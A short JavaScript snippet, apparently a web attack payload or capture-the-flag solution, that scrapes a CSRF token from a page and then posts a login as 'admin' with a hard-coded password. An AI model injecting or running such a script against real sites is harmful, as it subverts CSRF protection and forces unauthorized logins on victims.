xhr = new XMLHttpRequest();
xhr.open("GET", "/", false);
let csrf;
xhr.onload = function () {
    csrf= /id="csrf_token" value="(.*)"/.exec(xhr.response)[1];
};
xhr.send(null);


xhr.open("POST", "/api/user/login", false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
xhr.onload = function () {
};

data="username=admin&password=admin1234&csrf_token="+csrf;
console.log(data);
xhr.send(data);
